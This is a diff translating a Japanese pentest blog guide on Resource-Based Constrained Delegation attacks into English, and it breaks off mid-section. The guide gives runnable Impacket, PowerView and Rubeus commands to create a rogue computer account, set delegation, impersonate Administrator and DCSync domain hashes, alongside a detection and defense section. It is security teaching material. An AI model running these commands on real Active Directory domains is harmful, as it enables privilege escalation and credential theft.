@@ -1,246 +1,247 @@
 ---
-title: "RBCD (Resource-Based Constrained Delegation) 攻撃ガイド"
+title: "RBCD (Resource-Based Constrained Delegation) Attack Guide"
 date: 2026-03-03
-description: "Kerberos 委任の悪用による権限昇格攻撃の完全ガイド。RBCD の仕組みから S4U2Self/S4U2Proxy を使った実践的な攻撃手法、検出・防御策まで解説する。"
+description: "A complete guide to privilege escalation via Kerberos delegation abuse. Covers RBCD mechanics, S4U2Self/S4U2Proxy exploitation, practical attack commands, and detection/defense."
 categories: [TechBlog]
 tags: [active-directory, kerberos, rbcd, delegation, privilege-escalation, windows, impacket, pentest]
 mermaid: true
 ---
 
+# RBCD (Resource-Based Constrained Delegation) Attack Guide
 
-Kerberos 委任の悪用による権限昇格攻撃の完全ガイド
-
----
-
-## 目次
-
-1. [Kerberos 委任の基礎](https://claude.ai/chat/9585638f-0e35-4926-b6de-45c677ddc89e#kerberos-%E5%A7%94%E4%BB%BB%E3%81%AE%E5%9F%BA%E7%A4%8E)
-2. [RBCD とは](https://claude.ai/chat/9585638f-0e35-4926-b6de-45c677ddc89e#rbcd-%E3%81%A8%E3%81%AF)
-3. [RBCD 攻撃条件](https://claude.ai/chat/9585638f-0e35-4926-b6de-45c677ddc89e#rbcd-%E6%94%BB%E6%92%83%E6%9D%A1%E4%BB%B6)
-4. [攻撃フロー（シーケンス図）](https://claude.ai/chat/9585638f-0e35-4926-b6de-45c677ddc89e#%E6%94%BB%E6%92%83%E3%83%95%E3%83%AD%E3%83%BC%E3%82%B7%E3%83%BC%E3%82%B1%E3%83%B3%E3%82%B9%E5%9B%B3)
-5. [攻撃コマンド](https://claude.ai/chat/9585638f-0e35-4926-b6de-45c677ddc89e#%E6%94%BB%E6%92%83%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89)
-6. [実践例](https://claude.ai/chat/9585638f-0e35-4926-b6de-45c677ddc89e#%E5%AE%9F%E8%B7%B5%E4%BE%8B)
-7. [検出と防御](https://claude.ai/chat/9585638f-0e35-4926-b6de-45c677ddc89e#%E6%A4%9C%E5%87%BA%E3%81%A8%E9%98%B2%E5%BE%A1)
-8. [関連攻撃手法](https://claude.ai/chat/9585638f-0e35-4926-b6de-45c677ddc89e#%E9%96%A2%E9%80%A3%E6%94%BB%E6%92%83%E6%89%8B%E6%B3%95)
+A complete guide to privilege escalation via Kerberos delegation abuse.
 
 ---
 
-## Kerberos 委任の基礎
+## Table of Contents
 
-### 委任の種類
+1. [Kerberos Delegation Basics](#kerberos-delegation-basics)
+2. [What is RBCD](#what-is-rbcd)
+3. [RBCD Attack Prerequisites](#rbcd-attack-prerequisites)
+4. [Attack Flow (Sequence Diagrams)](#attack-flow-sequence-diagrams)
+5. [Attack Commands](#attack-commands)
+6. [Practical Examples](#practical-examples)
+7. [Detection and Defense](#detection-and-defense)
+8. [Related Attack Techniques](#related-attack-techniques)
 
-Active Directory には 3 種類の Kerberos 委任があります：
+---
 
-1. **Unconstrained Delegation** (無制限委任)
-2. **Constrained Delegation** (制限付き委任)
-3. **Resource-Based Constrained Delegation** (リソースベース制限付き委任 = RBCD)
+## Kerberos Delegation Basics
 
-### 委任が必要な理由
+### Types of Delegation
+
+Active Directory has 3 types of Kerberos delegation:
+
+1. **Unconstrained Delegation**
+2. **Constrained Delegation**
+3. **Resource-Based Constrained Delegation** (RBCD)
+
+### Why Delegation Is Needed
 
 ```mermaid
 sequenceDiagram
-    participant U as ユーザー
-    participant W as Webサーバー
-    participant D as DBサーバー
+    participant U as User
+    participant W as Web Server
+    participant D as DB Server
     participant DC as Domain Controller
-    
-    Note over U,D: 委任がない場合の問題
-    
-    U->>W: 1. Web アクセス
-    W->>DC: 2. ユーザーの認証確認
+
+    Note over U,D: Problem without delegation
+
+    U->>W: 1. Web access
+    W->>DC: 2. Verify user authentication
     DC->>W: 3. OK
-    W->>D: 4. DB アクセス試行
-    Note over W,D: ❌ ユーザーの資格情報がないため<br/>DB アクセス失敗
-    
-    Note over U,D: 委任がある場合
-    
-    U->>W: 1. Web アクセス（TGT付き）
-    W->>DC: 2. ユーザーになりすまして<br/>DB サービスチケット要求
-    DC->>W: 3. DB サービスチケット発行
-    W->>D: 4. ユーザーとして DB アクセス
-    Note over W,D: ✅ 委任により成功
+    W->>D: 4. Attempt DB access
+    Note over W,D: ❌ DB access fails because<br/>no user credentials available
+
+    Note over U,D: With delegation
+
+    U->>W: 1. Web access (with TGT)
+    W->>DC: 2. Request DB service ticket<br/>on behalf of user
+    DC->>W: 3. Issue DB service ticket
+    W->>D: 4. Access DB as the user
+    Note over W,D: ✅ Succeeds via delegation
 ```
 
 ---
 
-## RBCD とは
+## What is RBCD
 
-### 特徴
+### Key Characteristics
 
-- **コンピューターアカウント側で設定**（従来の委任は委任元で設定）
-- **msDS-AllowedToActOnBehalfOfOtherIdentity** 属性で制御
-- Domain Admin 権限なしで設定可能（書き込み権限があれば）
-- **S4U2Self** と **S4U2Proxy** を使用
+- **Configured on the computer account side** (traditional delegation is configured on the delegating side)
+- Controlled via the **msDS-AllowedToActOnBehalfOfOtherIdentity** attribute
+- Can be configured without Domain Admin privileges (only write permission required)
+- Uses **S4U2Self** and **S4U2Proxy**
 
-### 従来の委任との違い
+### Differences from Traditional Delegation
 
 ```mermaid
 flowchart LR
-    subgraph "Constrained Delegation (従来)"
-        A1[Webサーバー] -->|設定| A2[委任先を<br/>Webサーバーで指定]
-        A2 --> A3[DBサーバーに委任]
+    subgraph "Constrained Delegation (Traditional)"
+        A1[Web Server] -->|configure| A2[Specify delegation target<br/>on Web Server]
+        A2 --> A3[Delegate to DB Server]
     end
-    
-    subgraph "RBCD (リソースベース)"
-        B1[DBサーバー] -->|設定| B2[委任元を<br/>DBサーバーで指定]
-        B2 --> B3[Webサーバーからの<br/>委任を許可]
+
+    subgraph "RBCD (Resource-Based)"
+        B1[DB Server] -->|configure| B2[Specify delegation source<br/>on DB Server]
+        B2 --> B3[Allow delegation<br/>from Web Server]
     end
-    
+
     style A2 fill:#ff6b6b
     style B2 fill:#4ecdc4
-    
-    Note1[Domain Admin権限が必要]
-    Note2[GenericWrite権限で可能]
-    
+
+    Note1[Requires Domain Admin privileges]
+    Note2[Possible with GenericWrite]
+
     A2 -.-> Note1
     B2 -.-> Note2
 ```
 
 ---
 
-## RBCD 攻撃条件
+## RBCD Attack Prerequisites
 
-### ✅ 必要な条件
+### ✅ Required Conditions
 
-1. **ターゲットコンピューターへの書き込み権限**
-    
+1. **Write permission on the target computer**
+
     - `GenericWrite`
     - `GenericAll`
     - `WriteProperty` (msDS-AllowedToActOnBehalfOfOtherIdentity)
     - `WriteDACL`
-2. **コントロールできるコンピューターアカウント**
-    
-    - 新しいコンピューターアカウントを作成できる（`ms-DS-MachineAccountQuota > 0`）
-    - または既存のコンピューターアカウントの制御
-3. **ターゲットへのアクセス**
-    
-    - ターゲットが Service Principal Name (SPN) を持つ
-    - ターゲットがドメインに参加している
+2. **A computer account you control**
 
-### 攻撃可能なシナリオ例
+    - Ability to create a new computer account (`ms-DS-MachineAccountQuota > 0`)
+    - Or control of an existing computer account
+3. **Access to the target**
 
-- ユーザーが自分のコンピューターに対して `GenericAll` 権限を持つ（デフォルト設定）
-- Exchange Server などの特権サービスアカウントが誤設定されている
-- GPO で過剰な権限が付与されている
+    - Target has a Service Principal Name (SPN)
+    - Target is joined to the domain
+
+### Example Attack Scenarios
+
+- A user has `GenericAll` permission over their own computer (default configuration)
+- Privileged service accounts such as Exchange Server are misconfigured
+- Excessive permissions are granted via GPO
 
 ---
 
-## 攻撃フロー（シーケンス図）
+## Attack Flow (Sequence Diagrams)
 
-### 完全な攻撃シーケンス
+### Full Attack Sequence
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant A as 攻撃者<br/>(john)
+    participant A as Attacker<br/>(john)
     participant AD as Active Directory
-    participant Fake as 偽コンピューター<br/>(FAKE01$)
-    participant Target as ターゲット<br/>(WEB01)
+    participant Fake as Fake Computer<br/>(FAKE01$)
+    participant Target as Target<br/>(WEB01)
     participant DC as Domain Controller
-    
-    Note over A,DC: フェーズ 1: 権限確認と準備
-    
-    A->>AD: Get-DomainComputer WEB01 の<br/>ACL を確認
-    AD->>A: GenericWrite 権限あり
-    
-    A->>AD: Get-DomainObject<br/>ms-DS-MachineAccountQuota 確認
-    AD->>A: Quota = 10<br/>(コンピューター作成可能)
-    
-    Note over A,DC: フェーズ 2: 偽コンピューターアカウント作成
-    
+
+    Note over A,DC: Phase 1: Permission check and preparation
+
+    A->>AD: Check ACL of<br/>Get-DomainComputer WEB01
+    AD->>A: GenericWrite permission found
+
+    A->>AD: Check Get-DomainObject<br/>ms-DS-MachineAccountQuota
+    AD->>A: Quota = 10<br/>(can create computers)
+
+    Note over A,DC: Phase 2: Create fake computer account
+
     A->>AD: New-MachineAccount<br/>-MachineAccount FAKE01<br/>-Password Password123!
-    AD->>Fake: FAKE01$ を作成
-    Fake->>A: アカウント作成完了
-    
-    Note over A,DC: フェーズ 3: RBCD 設定
-    
-    A->>AD: WEB01 の<br/>msDS-AllowedToActOnBehalfOfOtherIdentity<br/>属性を変更
-    Note over A: FAKE01$ を追加
-    
-    AD->>Target: RBCD 設定適用
-    Note over Target: FAKE01$ からの委任を許可
-    
-    Note over A,DC: フェーズ 4: S4U2Self (自分のチケット取得)
-    
-    A->>DC: S4U2Self リクエスト<br/>From: FAKE01$<br/>For: Administrator
-    Note over A: FAKE01$ として<br/>Administrator のチケットを要求
-    
-    DC->>DC: FAKE01$ の資格情報確認
-    DC->>A: Administrator の<br/>Forwardable チケット発行
-    
-    Note over A,DC: フェーズ 5: S4U2Proxy (委任実行)
-    
-    A->>DC: S4U2Proxy リクエスト<br/>From: FAKE01$<br/>For: Administrator<br/>To: WEB01 (CIFS/HTTP/etc)
-    
-    DC->>DC: WEB01 の RBCD 設定確認
-    Note over DC: FAKE01$ からの委任が許可されている
-    
-    DC->>A: WEB01 への<br/>Administrator サービスチケット発行
-    
-    Note over A,DC: フェーズ 6: ターゲットアクセス
-    
-    A->>Target: Administrator として<br/>WEB01 にアクセス<br/>(SMB/HTTP/etc)
-    Target->>Target: チケット検証
-    Target->>A: アクセス許可
-    
-    Note over A: WEB01 を完全に制御
+    AD->>Fake: Create FAKE01$
+    Fake->>A: Account creation complete
+
+    Note over A,DC: Phase 3: Configure RBCD
+
+    A->>AD: Modify WEB01 attribute<br/>msDS-AllowedToActOnBehalfOfOtherIdentity
+    Note over A: Add FAKE01$
+
+    AD->>Target: Apply RBCD configuration
+    Note over Target: Allow delegation from FAKE01$
+
+    Note over A,DC: Phase 4: S4U2Self (obtain ticket for self)
+
+    A->>DC: S4U2Self request<br/>From: FAKE01$<br/>For: Administrator
+    Note over A: Request ticket for Administrator<br/>acting as FAKE01$
+
+    DC->>DC: Verify FAKE01$ credentials
+    DC->>A: Issue Forwardable ticket<br/>for Administrator
+
+    Note over A,DC: Phase 5: S4U2Proxy (execute delegation)
+
+    A->>DC: S4U2Proxy request<br/>From: FAKE01$<br/>For: Administrator<br/>To: WEB01 (CIFS/HTTP/etc)
+
+    DC->>DC: Check WEB01 RBCD configuration
+    Note over DC: Delegation from FAKE01$ is permitted
+
+    DC->>A: Issue Administrator service ticket<br/>for WEB01
+
+    Note over A,DC: Phase 6: Access target
+
+    A->>Target: Access WEB01 as Administrator<br/>(SMB/HTTP/etc)
+    Target->>Target: Validate ticket
+    Target->>A: Access granted
+
+    Note over A: Full control of WEB01
 ```
 
-### S4U 拡張の詳細
+### S4U Extension Details
 
 ```mermaid
 sequenceDiagram
     participant A as FAKE01$
     participant DC as DC
     participant T as WEB01
-    
-    Note over A,T: S4U2Self: 任意のユーザーの<br/>自分へのチケットを取得
-    
+
+    Note over A,T: S4U2Self: Obtain a ticket for any user<br/>directed to self
+
     A->>DC: TGS-REQ (S4U2Self)<br/>sname: FAKE01$<br/>for-user: Administrator
-    DC->>DC: FAKE01$ の権限確認
-    DC->>A: TGS-REP<br/>Forwardable チケット
-    
-    Note over A: 取得したチケット:<br/>Administrator → FAKE01$
-    
-    Note over A,T: S4U2Proxy: 取得したチケットを<br/>別のサービスに委任
-    
-    A->>DC: TGS-REQ (S4U2Proxy)<br/>sname: CIFS/WEB01<br/>additional-tickets: [Administrator→FAKE01$]
-    DC->>DC: WEB01 の RBCD 確認<br/>FAKE01$ が許可されている?
-    DC->>A: TGS-REP<br/>Administrator → WEB01
-    
-    Note over A: 取得したチケット:<br/>Administrator → WEB01/CIFS
-    
-    A->>T: AP-REQ<br/>Administrator のチケットで認証
-    T->>A: Administrator としてアクセス許可
+    DC->>DC: Check FAKE01$ permissions
+    DC->>A: TGS-REP<br/>Forwardable ticket
+
+    Note over A: Obtained ticket:<br/>Administrator -> FAKE01$
+
+    Note over A,T: S4U2Proxy: Delegate the obtained ticket<br/>to another service
+
+    A->>DC: TGS-REQ (S4U2Proxy)<br/>sname: CIFS/WEB01<br/>additional-tickets: [Administrator->FAKE01$]
+    DC->>DC: Check WEB01 RBCD<br/>Is FAKE01$ allowed?
+    DC->>A: TGS-REP<br/>Administrator -> WEB01
+
+    Note over A: Obtained ticket:<br/>Administrator -> WEB01/CIFS
+
+    A->>T: AP-REQ<br/>Authenticate with Administrator ticket
+    T->>A: Access granted as Administrator
 ```
 
 ---
 
-## 攻撃コマンド
+## Attack Commands
 
-### 1. 権限の確認
+### 1. Check Permissions
 
 **PowerView (Windows)**
 
 ```powershell
-# PowerView をインポート
+# Import PowerView
 Import-Module .\PowerView.ps1
 
-# ターゲットへの権限を確認
+# Check permissions on the target
 Get-DomainObjectAcl -Identity WEB01 | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser john).objectsid}
 
-# または特定の権限を検索
+# Or search for specific permissions
 Get-DomainObjectAcl -Identity WEB01 -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteProperty"}
 ```
 
-**BloodHound (推奨)**
+**BloodHound (recommended)**
 
 ```cypher
-// BloodHound クエリ: john から制御できるコンピューター
+// BloodHound query: computers controllable from john
 MATCH (u:User {name:"JOHN@CORP.LOCAL"})-[r:GenericAll|GenericWrite|WriteProperty|WriteDacl]->(c:Computer)
 RETURN u,r,c
 
-// 最短攻撃パス
+// Shortest attack path
 MATCH p=shortestPath((u:User {name:"JOHN@CORP.LOCAL"})-[*1..]->(c:Computer))
 WHERE ANY(rel in relationships(p) WHERE type(rel) IN ["GenericAll","GenericWrite","WriteProperty","WriteDacl"])
 RETURN p
@@ -249,172 +250,172 @@ RETURN p
 **Linux (Impacket)**
 
 ```bash
-# dacledit.py で権限確認
+# Check permissions with dacledit.py
 impacket-dacledit -action read -principal john -target WEB01$ corp.local/john:'Password123!' -dc-ip 10.10.10.100
 ```
 
-### 2. MachineAccountQuota の確認
+### 2. Check MachineAccountQuota
 
 **PowerShell**
 
 ```powershell
-# ドメイン全体の Quota 確認
+# Check Quota for the entire domain
 Get-DomainObject -Identity "DC=corp,DC=local" -Properties ms-DS-MachineAccountQuota
 
-# 現在作成されているコンピューター数
+# Current number of created computers
 (Get-DomainComputer).Count
 ```
 
 **Linux**
 
 ```bash
-# ldapsearch で確認
+# Check with ldapsearch
 ldapsearch -x -H ldap://10.10.10.100 -D "cn=john,cn=users,dc=corp,dc=local" -w 'Password123!' -b "dc=corp,dc=local" "(objectClass=domain)" ms-DS-MachineAccountQuota
 
-# 出力例: ms-DS-MachineAccountQuota: 10
+# Example output: ms-DS-MachineAccountQuota: 10
 ```
 
-### 3. 偽コンピューターアカウントの作成
+### 3. Create a Fake Computer Account
 
 **Powermad (Windows)**
 
 ```powershell
-# Powermad をインポート
+# Import Powermad
 Import-Module .\Powermad.ps1
 
-# 新しいコンピューターアカウント作成
+# Create a new computer account
 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
 
-# 確認
+# Verify
 Get-DomainComputer FAKE01
 ```
 
-**Impacket (Linux) - 推奨**
+**Impacket (Linux) - recommended**
 
 ```bash
-# addcomputer.py でコンピューター作成
+# Create computer with addcomputer.py
 impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Password123!' -dc-ip 10.10.10.100 corp.local/john:'Password123!'
 
-# 出力例:
+# Example output:
 # [*] Successfully added machine account FAKE01$ with password Password123!
 ```
 
-**StandIn (Windows - オルタナティブ)**
+**StandIn (Windows - alternative)**
 
 ```powershell
-# StandIn でコンピューター作成
+# Create computer with StandIn
 .\StandIn.exe --computer FAKE01 --make
 ```
 
-### 4. RBCD の設定
+### 4. Configure RBCD
 
 **PowerView (Windows)**
 
 ```powershell
-# PowerView で RBCD を設定
+# Configure RBCD with PowerView
 
-# FAKE01$ の SID を取得
+# Get the SID of FAKE01$
 $ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select-Object -ExpandProperty objectsid
 
-# Security Descriptor を作成
+# Create Security Descriptor
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
 $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
 
-# WEB01 の msDS-AllowedToActOnBehalfOfOtherIdentity に設定
+# Set on WEB01's msDS-AllowedToActOnBehalfOfOtherIdentity
 Set-DomainObject -Identity WEB01 -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
 ```
 
-**Impacket rbcd.py (Linux) - 推奨**
+**Impacket rbcd.py (Linux) - recommended**
 
 ```bash
-# rbcd.py で RBCD を設定
+# Configure RBCD with rbcd.py
 impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'WEB01$' -dc-ip 10.10.10.100 -action write corp.local/john:'Password123!'
 
-# 出力例:
+# Example output:
 # [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
 # [*] Delegation rights modified successfully!
 # [*] FAKE01$ can now impersonate users on WEB01$ via S4U2Proxy
 ```
 
-**確認**
+**Verify**
 
 ```bash
-# 設定された RBCD を確認
+# Verify the configured RBCD
 impacket-rbcd -delegate-to 'WEB01$' -dc-ip 10.10.10.100 -action read corp.local/john:'Password123!'
 
-# 出力例:
+# Example output:
 # [*] Accounts allowed to act on behalf of other identity:
 # [*]     FAKE01$       (S-1-5-21-...)
 ```
 
-### 5. S4U 攻撃の実行（チケット取得）
+### 5. Execute S4U Attack (Obtain Ticket)
 
-**Impacket getST.py (Linux) - 推奨**
+**Impacket getST.py (Linux) - recommended**
 
 ```bash
-# getST.py で Administrator のサービスチケットを取得
+# Obtain Administrator service ticket with getST.py
 impacket-getST -spn cifs/web01.corp.local -impersonate Administrator -dc-ip 10.10.10.100 corp.local/FAKE01$:'Password123!'
 
-# 出力:
+# Output:
 # [*] Getting TGT for user
 # [*] Impersonating Administrator
 # [*] Requesting S4U2self
 # [*] Requesting S4U2Proxy
 # [*] Saving ticket in Administrator@cifs_web01.corp.local@CORP.LOCAL.ccache
 
-# 複数のサービスを指定
+# Specify multiple services
 impacket-getST -spn cifs/web01.corp.local -spn http/web01.corp.local -impersonate Administrator -dc-ip 10.10.10.100 corp.local/FAKE01$:'Password123!'
 ```
 
 **Rubeus (Windows)**
 
 ```powershell
-# Rubeus で S4U 攻撃
-.\Rubeus.exe s4u /user:FAKE01$ /rc4:[FAKE01$のNTLMハッシュ] /impersonateuser:Administrator /msdsspn:cifs/web01.corp.local /ptt
+# S4U attack with Rubeus
+.\Rubeus.exe s4u /user:FAKE01$ /rc4:[NTLM hash of FAKE01$] /impersonateuser:Administrator /msdsspn:cifs/web01.corp.local /ptt
 
-# または
+# Or
 .\Rubeus.exe s4u /user:FAKE01$ /password:Password123! /impersonateuser:Administrator /msdsspn:cifs/web01.corp.local /ptt
 
-# /ptt = Pass-the-Ticket (自動的にメモリに注入)
+# /ptt = Pass-the-Ticket (automatically injected into memory)
 ```
 
-**NTLM ハッシュの計算**
+**Calculate NTLM Hash**
 
 ```bash
-# FAKE01$ の NTLM ハッシュを計算
+# Calculate NTLM hash for FAKE01$
 python3 -c 'import hashlib; print(hashlib.new("md4", "Password123!".encode("utf-16le")).hexdigest())'
 
-# 出力例: 32ED87BDB5FDC5E9CBA88547376818D4
+# Example output: 32ED87BDB5FDC5E9CBA88547376818D4
 ```
 
-### 6. ターゲットへのアクセス
+### 6. Access the Target
 
 **Linux (Impacket)**
 
 ```bash
-# KRB5CCNAME 環境変数にチケットを設定
+# Set the ticket in the KRB5CCNAME environment variable
 export KRB5CCNAME=Administrator@cifs_web01.corp.local@CORP.LOCAL.ccache
 
-# SMB アクセス
+# SMB access
 impacket-smbexec -k -no-pass web01.corp.local
 
-# または PSExec
+# Or PSExec
 impacket-psexec -k -no-pass Administrator@web01.corp.local
 
-# または secretsdump
+# Or secretsdump
 impacket-secretsdump -k -no-pass web01.corp.local
 
-# WMI 実行
+# WMI execution
 impacket-wmiexec -k -no-pass Administrator@web01.corp.local
 ```
 
 **Windows**
 
 ```powershell
-# チケットが /ptt でメモリに注入されている場合
+# When the ticket has been injected into memory with /ptt
 
-# SMB アクセス
+# SMB access
 dir \\web01\c$
 
 # PSExec
@@ -423,91 +424,91 @@ dir \\web01\c$
 # WinRM
 Enter-PSSession -ComputerName web01
 
-# リモートコマンド実行
+# Remote command execution
 Invoke-Command -ComputerName web01 -ScriptBlock { whoami }
 ```
 
-### 7. 追加の SPN でのアクセス
+### 7. Access with Additional SPNs
 
 ```bash
-# HTTP サービスへのチケット取得
+# Obtain ticket for HTTP service
 impacket-getST -spn http/web01.corp.local -impersonate Administrator -dc-ip 10.10.10.100 corp.local/FAKE01$:'Password123!'
 export KRB5CCNAME=Administrator@http_web01.corp.local@CORP.LOCAL.ccache
 
-# LDAP サービス
+# LDAP service
 impacket-getST -spn ldap/web01.corp.local -impersonate Administrator -dc-ip 10.10.10.100 corp.local/FAKE01$:'Password123!'
 
-# HOST サービス（複数のサービスを含む）
+# HOST service (includes multiple services)
 impacket-getST -spn host/web01.corp.local -impersonate Administrator -dc-ip 10.10.10.100 corp.local/FAKE01$:'Password123!'
 ```
 
 ---
 
-## 実践例
+## Practical Examples
 
-### シナリオ 1: ユーザーが自分の PC に対する権限を持つ
+### Scenario 1: User Has Permission Over Their Own PC
 
-多くの環境では、ユーザーは自分のコンピューターに対して `GenericAll` 権限を持ちます。
+In many environments, users have `GenericAll` permission over their own computer.
 
 ```bash
-# 1. 権限確認
+# 1. Check permissions
 impacket-dacledit -action read -principal john -target JOHN-PC$ corp.local/john:'Password123!' -dc-ip 10.10.10.100
-# GenericAll 権限を確認
+# Confirm GenericAll permission
 
-# 2. 偽コンピューター作成
+# 2. Create fake computer
 impacket-addcomputer -computer-name 'EVILPC$' -computer-pass 'EvilPass123!' -dc-ip 10.10.10.100 corp.local/john:'Password123!'
 
-# 3. RBCD 設定
+# 3. Configure RBCD
 impacket-rbcd -delegate-from 'EVILPC$' -delegate-to 'JOHN-PC$' -dc-ip 10.10.10.100 -action write corp.local/john:'Password123!'
 
-# 4. チケット取得
+# 4. Obtain ticket
 impacket-getST -spn cifs/john-pc.corp.local -impersonate Administrator -dc-ip 10.10.10.100 corp.local/EVILPC$:'EvilPass123!'
 
-# 5. アクセス
+# 5. Access
 export KRB5CCNAME=Administrator@cifs_john-pc.corp.local@CORP.LOCAL.ccache
 impacket-psexec -k -no-pass Administrator@john-pc.corp.local
 ```
 
-### シナリオ 2: Domain Controller への昇格
+### Scenario 2: Escalation to Domain Controller
 
-DC に対して `GenericWrite` 権限を持つ場合（稀だが強力）：
+When you have `GenericWrite` permission on a DC (rare but powerful):
 
 ```bash
-# 1. DC への権限確認
+# 1. Check permissions on DC
 impacket-dacledit -action read -principal john -target DC01$ corp.local/john:'Password123!' -dc-ip 10.10.10.100
 
-# 2. 偽コンピューター作成
+# 2. Create fake computer
 impacket-addcomputer -computer-name 'FAKEDC$' -computer-pass 'FakeDC123!' -dc-ip 10.10.10.100 corp.local/john:'Password123!'
 
-# 3. RBCD 設定
+# 3. Configure RBCD
 impacket-rbcd -delegate-from 'FAKEDC$' -delegate-to 'DC01$' -dc-ip 10.10.10.100 -action write corp.local/john:'Password123!'
 
-# 4. DCSync 用のチケット取得
+# 4. Obtain ticket for DCSync
 impacket-getST -spn ldap/dc01.corp.local -impersonate Administrator -dc-ip 10.10.10.100 corp.local/FAKEDC$:'FakeDC123!'
 
-# 5. DCSync 実行
+# 5. Run DCSync
 export KRB5CCNAME=Administrator@ldap_dc01.corp.local@CORP.LOCAL.ccache
 impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@dc01.corp.local
 
-# Domain Admin ハッシュ取得！
+# Domain Admin hash obtained!
 ```
 
-### シナリオ 3: コンピューターアカウントを既に制御している場合
+### Scenario 3: Already Controlling a Computer Account
 
 ```bash
-# 既にコンピューターアカウントのパスワードを知っている場合
-# （例: LAPS の脆弱性、平文パスワードの発見など）
+# When you already know the password of a computer account
+# (e.g., via LAPS vulnerability, plaintext password discovery, etc.)
 
-# 1. 制御しているコンピューター: COMPROMISED01$
-# パスワード: CompPass123!
+# 1. Controlled computer: COMPROMISED01$
+# Password: CompPass123!
 
-# 2. ターゲット: WEB01$
-# 権限: COMPROMISED01$ が WEB01$ に対して GenericWrite を持つ
+# 2. Target: WEB01$
+# Permission: COMPROMISED01$ has GenericWrite over WEB01$
 
-# 3. RBCD 設定
+# 3. Configure RBCD
 impacket-rbcd -delegate-from 'COMPROMISED01$' -delegate-to 'WEB01$' -dc-ip 10.10.10.100 -action write corp.local/COMPROMISED01$:'CompPass123!'
 
-# 4. チケット取得と攻撃
+# 4. Obtain ticket and attack
 impacket-getST -spn cifs/web01.corp.local -impersonate Administrator -dc-ip 10.10.10.100 corp.local/COMPROMISED01$:'CompPass123!'
 
 export KRB5CCNAME=Administrator@cifs_web01.corp.local@CORP.LOCAL.ccache
@@ -516,73 +517,73 @@ impacket-psexec -k -no-pass Administrator@web01.corp.local
 
 ---
 
-## 検出と防御
+## Detection and Defense
 
-### 検出方法
+### Detection Methods
 
-**1. イベントログ監視**
+**1. Event Log Monitoring**
 
 ```powershell
-# イベント ID 4742: コンピューターアカウントの変更
+# Event ID 4742: Computer account change
 Get-WinEvent -FilterHashtable @{LogName='Security';Id=4742} | Where-Object {$_.Message -match "msDS-AllowedToActOnBehalfOfOtherIdentity"}
 
-# イベント ID 4741: コンピューターアカウントの作成
+# Event ID 4741: Computer account creation
 Get-WinEvent -FilterHashtable @{LogName='Security';Id=4741}
 
-# イベント ID 4769: Kerberos サービスチケット要求
-# S4U2Self/S4U2Proxy を検出
+# Event ID 4769: Kerberos service ticket request
+# Detect S4U2Self/S4U2Proxy
 Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769} | Where-Object {$_.Message -match "Ticket Options.*0x40810000"}
 ```
 
-**2. RBCD 設定の監査**
+**2. Audit RBCD Configuration**
 
 ```powershell
-# 全コンピューターの RBCD 設定を確認
+# Check RBCD configuration on all computers
 Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "msDS-AllowedToActOnBehalfOfOtherIdentity"}
 
-# または
+# Or
 Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Where-Object {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null}
 ```
 
-**3. 新規コンピューターアカウントの監視**
+**3. Monitor for New Computer Accounts**
 
 ```powershell
-# 最近作成されたコンピューター（24時間以内）
+# Computers created recently (within 24 hours)
 Get-ADComputer -Filter {whenCreated -gt $((Get-Date).AddDays(-1))} -Properties whenCreated | Select-Object Name,whenCreated
 ```
 
-### 防御策
+### Defenses
 
-**1. MachineAccountQuota を 0 に設定**
+**1. Set MachineAccountQuota to 0**
 
 ```powershell
-# ドメインレベルで設定
+# Set at the domain level
 Set-ADDomain -Identity corp.local -Replace @{"ms-DS-MachineAccountQuota"="0"}
 
-# 確認
+# Verify
 Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties ms-DS-MachineAccountQuota
 ```
 
-**2. コンピューターアカウントへの書き込み権限を制限**
+**2. Restrict Write Permissions on Computer Accounts**
 
 ```powershell
-# 不要な GenericWrite/GenericAll 権限を削除
-# BloodHound で監査してから削除
+# Remove unnecessary GenericWrite/GenericAll permissions
+# Audit with BloodHound before removing
 ```
 
-**3. Protected Users グループの使用**
+**3. Use the Protected Users Group**
 
 ```powershell
-# 特権ユーザーを Protected Users に追加
+# Add privileged users to Protected Users
 Add-ADGroupMember -Identity "Protected Users" -Members Administrator,krbtgt
 
-# Protected Users は委任を使用できない
+# Protected Users cannot use delegation
 ```
 
-**4. RBCD 監視スクリプトの導入**
+**4. Deploy RBCD Monitoring Script**
 
 ```powershell
-# 定期的に RBCD 設定を監査
+# Periodically audit RBCD configuration
 $computers = Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
 foreach ($computer in $computers) {
     if ($computer.'msDS-AllowedToActOnBehalfOfOtherIdentity') {
@@ -593,176 +594,177 @@ foreach ($computer in $computers) {
 
 ---
 
-## 関連攻撃手法
+## Related Attack Techniques
 
-### Unconstrained Delegation 攻撃
+### Unconstrained Delegation Attack
 
 ```mermaid
 sequenceDiagram
-    participant A as 攻撃者
-    participant UC as Unconstrained<br/>Delegation<br/>サーバー
+    participant A as Attacker
+    participant UC as Unconstrained<br/>Delegation<br/>Server
     participant DC as Domain Controller
-    participant V as 被害者<br/>(Domain Admin)
-    
+    participant V as Victim<br/>(Domain Admin)
+
     Note over UC: TrustedForDelegation = True
-    
-    A->>UC: サーバーを侵害
-    
-    Note over A: Coercion 攻撃で<br/>Domain Admin を誘導
-    
+
